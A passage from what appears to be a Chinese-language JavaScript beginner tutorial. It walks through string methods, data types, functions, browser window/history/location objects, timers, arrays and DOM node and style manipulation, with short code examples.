class="number">0</span>)+ <span class="string">'&lt;br&gt;'</span>);</span><br><span class="line"> <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">"把字符串转换成大写:"</span> + str.<span class="title function_">toUpperCase</span>()+ <span class="string">'&lt;br&gt;'</span>)</span><br><span class="line"> <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">"把字符串转换为小写:"</span> + str.<span class="title function_">toLowerCase</span>()+ <span class="string">'&lt;br&gt;'</span>)</span><br><span class="line"> <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">"返回某个指定值首次出现的位置:"</span> + +str.<span class="title function_">indexOf</span>(<span class="string">"a"</span>)+ <span class="string">'&lt;br&gt;'</span>) <span class="comment">//如果没有这个值返回-1</span></span><br><span class="line"> <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">"返回某个指定值的位置，没有这个值的时候:"</span> + str.<span class="title function_">indexOf</span>(<span class="string">"bbb"</span>) + <span class="string">'&lt;br&gt;'</span>)</span><br><span class="line"> <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">"提取两个下标中间的字符串:"</span> + str.<span class="title function_">substring</span>(<span class="number">5</span>,<span class="number">7</span>)+ <span class="string">'&lt;br&gt;'</span>)</span><br><span class="line"> <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">"把字符串分割成字符:"</span> + str.<span class="title function_">split</span>(<span class="string">""</span>)+ <span class="string">'&lt;br&gt;'</span>)</span><br><span class="line"> <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">"一些字符替换另一些字符:"</span> + str.<span class="title function_">replace</span>(<span class="number">123</span>,<span class="string">"HHH"</span>)+ <span class="string">'&lt;br&gt;'</span>)</span><br></pre></td></tr></tbody></table></figure><h5 id="3-判断数据类型"><a href="#3-判断数据类型" class="headerlink" title="3.判断数据类型"></a>3.判断数据类型</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//变量</span></span><br><span class="line">  <span class="keyword">var</span> name = <span class="string">"zhangsan"</span>;</span><br><span class="line">  <span class="keyword">var</span> sex = <span class="string">"男"</span>;</span><br><span class="line">  <span class="keyword">var</span> isa = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">  <span class="keyword">var</span> e = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="comment">//判断数据类型并返回</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">typeof</span>(name));</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">typeof</span>(age));</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">typeof</span>(isa));</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">typeof</span>(d));</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">typeof</span>(e));</span><br></pre></td></tr></tbody></table></figure><h5 id="4-语句"><a href="#4-语句" class="headerlink" title="4.语句"></a>4.语句</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> age = <span class="number">18</span>;</span><br><span class="line"><span class="keyword">if</span> (age &gt; <span class="number">18</span>){</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"成年"</span>);</span><br><span class="line">  }<span class="keyword">else</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"未成年"</span>)</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><h5 id="5-方法（函数）"><a href="#5-方法（函数）" class="headerlink" title="5.方法（函数）"></a>5.方法（函数）</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//写一个方法（函数）</span></span><br><span class="line"><span class="comment">//function 方法名（参数）{}</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">confirm</span>(<span class="string">"学会了吗？"</span>)){</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">"你真棒"</span>)</span><br><span class="line">        }<span class="keyword">else</span> {</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">"继续努力"</span>)</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"><span class="comment">//有参</span></span><br><span class="line"> <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params">a,num</span>) {</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">confirm</span>(<span class="string">"学会了吗？"</span>)){</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">"你真棒"</span>)</span><br><span class="line">        }<span class="keyword">else</span> {</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">"继续努力"</span>)</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"><span class="comment">//    函数声明</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">show3</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">"好好学习"</span>)</span><br><span class="line">    }</span><br><span class="line"><span class="comment">//    函数表达式</span></span><br><span class="line">    <span class="keyword">var</span> show1 = <span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">"好好学习"</span>)</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h5 id="6-隐式全局变量"><a href="#6-隐式全局变量" class="headerlink" title="6.隐式全局变量"></a>6.隐式全局变量</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//全局变量</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"> <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) {</span><br><span class="line">     <span class="comment">//局部变量</span></span><br><span class="line">       <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">     <span class="comment">//隐式全局变量</span></span><br><span class="line">       b = <span class="number">3</span>;</span><br><span class="line">    }</span><br><span class="line"><span class="title function_">alert</span>(a); <span class="comment">//输出全局 不输出局部 </span></span><br><span class="line"><span class="title function_">alert</span>(b); <span class="comment">//虽在局部 但取消 var 后为隐式可以输出</span></span><br><span class="line"><span class="keyword">delete</span> a; <span class="comment">//全局变量不能被删除</span></span><br><span class="line"><span class="keyword">delete</span> b; <span class="comment">//隐式全局变量可以被删除</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//作用域链用就近原则</span></span><br></pre></td></tr></tbody></table></figure><h5 id="7-window对象"><a href="#7-window对象" class="headerlink" title="7.window对象"></a>7.window对象</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"showDB()"</span>&gt;</span>百度一下你就知道<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"opentext2()"</span>&gt;</span>打开新窗口<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"clost()"</span>&gt;</span>关闭当前窗口<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">showDB</span>(<span class="params"></span>) {</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">"https://baidu.com"</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    }</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">opentext2</span>(<span class="params"></span>) {</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">"text02.html"</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    }</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">clost</span>(<span class="params"></span>) {</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">window</span>.<span class="title function_">close</span>()</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    }</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure><h5 id="8-history对象"><a href="#8-history对象" class="headerlink" title="8.history对象"></a>8.history对象</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span>&gt;</span>跳转<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"back()"</span>&gt;</span>返回<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"forward()"</span>&gt;</span>前进<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">back</span>(<span class="params"></span>) {</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        history.<span class="title function_">back</span>()</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    }</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">forward</span>(<span class="params"></span>) {</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        history.<span class="title function_">forward</span>()</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    }</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">goback</span>(<span class="params"></span>) { <span class="comment">//1 前进</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        history.<span class="title function_">go</span>(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    }</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">goforward</span>(<span class="params"></span>) {</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        history.<span class="title function_">go</span>(-<span class="number">1</span>) <span class="comment">//-1 后退</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    }</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    history.<span class="title function_">go</span>(<span class="number">2</span>); <span class="comment">// 前进两页</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">history.<span class="title function_">go</span>(<span class="string">"text02.html"</span>) <span class="comment">//跳转历史记录中包含该字符串的最近位置</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure><h5 id="9-location"><a href="#9-location" class="headerlink" title="9.location"></a>9.location</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"reLoadTest04()"</span>&gt;</span>刷新<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"replace()"</span>&gt;</span>替换<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">reLoadTest04</span>(<span class="params"></span>) {</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        location.<span class="title function_">reload</span>(); <span class="comment">//刷新</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    }</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">replace</span>(<span class="params"></span>) {</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        location.<span class="title function_">replace</span>(<span class="string">"text02.html"</span>) <span class="comment">//替换</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    }</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(location.<span class="property">host</span>); <span class="comment">//返回服务器名称和端口号</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(location.<span class="property">hostname</span>); <span class="comment">//返回不带端口号的服务器名称</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(location.<span class="property">href</span>); <span class="comment">//返回当前加载页面的完整URL</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure><h5 id="10-Document"><a href="#10-Document" class="headerlink" title="10.Document"></a>10.Document</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">产品名称:<span class="language-xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"p14"</span>&gt;</span>iphone14<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"changePhone()"</span>&gt;</span>更换产品<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line">规格选择:&lt;input name="size" value="64G" type="button"&gt;</span><br><span class="line">&lt;input name="size" value="128G" type="button"&gt;</span><br><span class="line">&lt;input name="size" value="256G" type="button"&gt;</span><br><span class="line">&lt;input name="size" value="512G" type="button"&gt;</span><br><span class="line">&lt;input value="1T" type="button"&gt;</span><br><span class="line">&lt;button onclick="chooseSize()"&gt;选择规格&lt;/button&gt;&lt;br/&gt;</span><br><span class="line">&lt;button onclick="chooseInput()"&gt;选择所有&lt;/button&gt;</span><br><span class="line">&lt;textarea id="tt" rows="3" cols="35"&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/textarea&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function chooseInput() {</span><br><span class="line">        var inputs = document.getElementsByTagName("input"); //通过元素标签读取内容</span><br><span class="line">        var str="";</span><br><span class="line">        for (var i = 0; i &lt; inputs.length; i++) { //遍历</span><br><span class="line">            str+= inputs[i].value+"&amp;nbsp&amp;nbsp"; //读取value里的内容</span><br><span class="line">        }</span><br><span class="line">        document.getElementById("tt").innerHTML=str; //添加到 ID = tt 的内容里</span><br><span class="line">    }</span><br><span class="line">    function changePhone() {</span><br><span class="line">        document.getElementById("p14").innerHTML="iphone14 plus"</span><br><span class="line">    }</span><br><span class="line">    function chooseSize() {</span><br><span class="line">        var sizes = document.getElementsByName("size");</span><br><span class="line">        var str="";</span><br><span class="line">        for (var i = 0; i &lt; sizes.length; i++) {</span><br><span class="line">            str+= sizes[i].value+"&amp;nbsp&amp;nbsp";</span><br><span class="line">        }</span><br><span class="line">        document.getElementById("tt").innerHTML=str;</span><br><span class="line">    }</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><h5 id="11-定时函数"><a href="#11-定时函数" class="headerlink" title="11.定时函数"></a>11.定时函数</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"clearPlan()"</span>&gt;</span>清除计划<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="built_in">setTimeout</span>(<span class="string">"f()"</span>,<span class="number">3000</span>); <span class="comment">//超时调用</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) {</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="title function_">alert</span>(<span class="string">"已经过去了3000"</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    }</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> myplan = <span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) { <span class="comment">//间歇调用</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"好好学习"</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    },<span class="number">3000</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">clearPlan</span>(<span class="params"></span>) {</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="built_in">clearTimeout</span>(myplan)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    }</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><h5 id="11-1-钟表例子"><a href="#11-1-钟表例子" class="headerlink" title="11.1 钟表例子"></a>11.1 钟表例子</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>钟表展示<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"time"</span>&gt;</span> <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">   <span class="keyword">function</span> <span class="title function_">time</span>(<span class="params"></span>) {</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">       <span class="keyword">var</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">       <span class="keyword">let</span> <span class="title class_">Year</span> = date.<span class="title function_">getFullYear</span>(); <span class="comment">//年</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">       <span class="keyword">let</span> month = date.<span class="title function_">getMonth</span>()+<span class="number">1</span>; <span class="comment">//月</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">       <span class="keyword">let</span> day = date.<span class="title function_">getDate</span>(); <span class="comment">//日</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">       <span class="keyword">let</span> hours = date.<span class="title function_">getHours</span>(); <span class="comment">//小时</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">       <span class="keyword">let</span> minutes = date.<span class="title function_">getMinutes</span>(); <span class="comment">//分钟</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">       <span class="keyword">let</span> seconds = date.<span class="title function_">getSeconds</span>(); <span class="comment">//秒</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">       <span class="keyword">var</span> timeStr = <span class="title class_">Year</span> + <span class="string">"-"</span> +  month +<span class="string">"-"</span> + day +<span class="string">"-"</span> + hours +<span class="string">"-"</span> + minutes +<span class="string">"-"</span> + seconds;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">       <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"time"</span>).<span class="property">innerHTML</span>=timeStr;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">   }</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">   <span class="built_in">setInterval</span>(<span class="string">"time()"</span>,<span class="number">1000</span>) <span class="comment">//每隔1秒间歇运行一次</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><h5 id="12-Array"><a href="#12-Array" class="headerlink" title="12.Array"></a>12.Array</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">35</span>,<span class="number">26</span>,<span class="number">54</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">58</span>];</span><br><span class="line">    arr.<span class="title function_">sort</span>(<span class="function">(<span class="params">a,b</span>)=&gt;</span>{</span><br><span class="line">        <span class="keyword">return</span> a-b; <span class="comment">//排序</span></span><br><span class="line">    });</span><br><span class="line"> <span class="comment">/*   升序排列 : return a - b</span></span><br><span class="line"><span class="comment">      降序排序 : return b - a*/</span></span><br><span class="line">    arr.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">value, index, array</span>) {</span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(value) <span class="comment">//遍历数组</span></span><br><span class="line">    });</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><h5 id="13-节点"><a href="#13-节点" class="headerlink" title="13.节点"></a>13.节点</h5><p>在JavaScript中，节点（Node）是指DOM（文档对象模型）中的元素、属性、文本等。节点是构成网页结构的基本单元，可以通过JavaScript来操作和修改节点，实现动态的网页效果。</p><p>以下是一些常见的节点类型和对应的例子：</p><ol><li>元素节点（Element Node）：表示HTML中的标签元素，如<code>&lt;div&gt;</code>、<code>&lt;p&gt;</code>、<code>&lt;a&gt;</code>等。可以通过JavaScript来获取、创建、修改和删除元素节点。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 获取元素节点</span></span><br><span class="line"><span class="keyword">let</span> element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'myElement'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建元素节点</span></span><br><span class="line"><span class="keyword">let</span> newElement = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">'div'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改元素节点</span></span><br><span class="line">element.<span class="property">textContent</span> = <span class="string">'Hello, World!'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除元素节点</span></span><br><span class="line">element.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(element);</span><br></pre></td></tr></tbody></table></figure><ol><li>文本节点（Text Node）：表示HTML中的文本内容，如<code>Hello, World!</code>。可以通过JavaScript来获取、创建、修改和删除文本节点。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 获取文本节点</span></span><br><span class="line"><span class="keyword">let</span> textNode = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">'Hello, World!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建文本节点</span></span><br><span class="line"><span class="keyword">let</span> newText = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">'Hello, JavaScript!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改文本节点</span></span><br><span class="line">textNode.<span class="property">textContent</span> = <span class="string">'Hello, New World!'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除文本节点</span></span><br><span class="line">textNode.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(textNode);</span><br></pre></td></tr></tbody></table></figure><ol><li>属性节点（Attribute Node）：表示HTML元素的属性，如<code>id</code>、<code>class</code>、<code>src</code>等。可以通过JavaScript来获取、创建、修改和删除属性节点。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">javascript复制代码<span class="comment">// 获取属性节点</span></span><br><span class="line"><span class="keyword">let</span> attribute = element.<span class="title function_">getAttribute</span>(<span class="string">'id'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建属性节点</span></span><br><span class="line">element.<span class="title function_">setAttribute</span>(<span class="string">'class'</span>, <span class="string">'myClass'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改属性节点</span></span><br><span class="line">element.<span class="title function_">setAttribute</span>(<span class="string">'src'</span>, <span class="string">'image.jpg'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除属性节点</span></span><br><span class="line">element.<span class="title function_">removeAttribute</span>(<span class="string">'class'</span>);</span><br></pre></td></tr></tbody></table></figure><ol><li>注释节点（Comment Node）：表示HTML中的注释内容，如<code>&lt;!-- This is a comment --&gt;</code>。可以通过JavaScript来获取、创建、修改和删除注释节点。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 获取注释节点</span></span><br><span class="line"><span class="keyword">let</span> comment = <span class="variable language_">document</span>.<span class="title function_">createComment</span>(<span class="string">'This is a comment'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建注释节点</span></span><br><span class="line"><span class="keyword">let</span> newComment = <span class="variable language_">document</span>.<span class="title function_">createComment</span>(<span class="string">'New comment'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改注释节点</span></span><br><span class="line">comment.<span class="property">textContent</span> = <span class="string">'Updated comment'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除注释节点</span></span><br><span class="line">comment.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(comment);</span><br></pre></td></tr></tbody></table></figure><p>这些节点类型是DOM中最常见的节点，通过JavaScript可以对它们进行各种操作，实现动态的网页效果。新手可以通过这些例子来理解节点的概念和使用方法。</p><h5 id="14-style样式"><a href="#14-style样式" class="headerlink" title="14.style样式"></a>14.style样式</h5><p>在JavaScript中，可以使用<code>style</code>属性来操作和修改HTML元素的样式。<code>style</code>属性是一个对象，包含了元素的各种样式属性和对应的值。</p><p>以下是一些常见的<code>style</code>样式属性和对应的例子：</p><ol><li><code>backgroundColor</code>：设置元素的背景颜色。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 设置元素的背景颜色为红色</span></span><br><span class="line">element.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">"red"</span>;</span><br></pre></td></tr></tbody></table></figure><ol><li><code>color</code>：设置元素的文本颜色。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 设置元素的文本颜色为蓝色</span></span><br><span class="line">element.<span class="property">style</span>.<span class="property">color</span> = <span class="string">"blue"</span>;</span><br></pre></td></tr></tbody></table></figure><ol><li><code>fontSize</code>：设置元素的字体大小。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 设置元素的字体大小为20像素</span></span><br><span class="line">element.<span class="property">style</span>.<span class="property">fontSize</span> = <span class="string">"20px"</span>;</span><br></pre></td></tr></tbody></table></figure><ol><li><code>width</code>：设置元素的宽度。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 设置元素的宽度为200像素</span></span><br><span class="line">element.<span class="property">style</span>.<span class="property">width</span> = <span class="string">"200px"</span>;</span><br></pre></td></tr></tbody></table></figure><ol><li><code>height</code>：设置元素的高度。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 设置元素的高度为100像素</span></span><br><span class="line">element.<span class="property">style</span>.<span class="property">height</span> = <span class="string">"100px"</span>;</span><br></pre></td></tr></tbody></table></figure><ol><li><code>display</code>：设置元素的显示方式。</li></ol><figure class="highlight 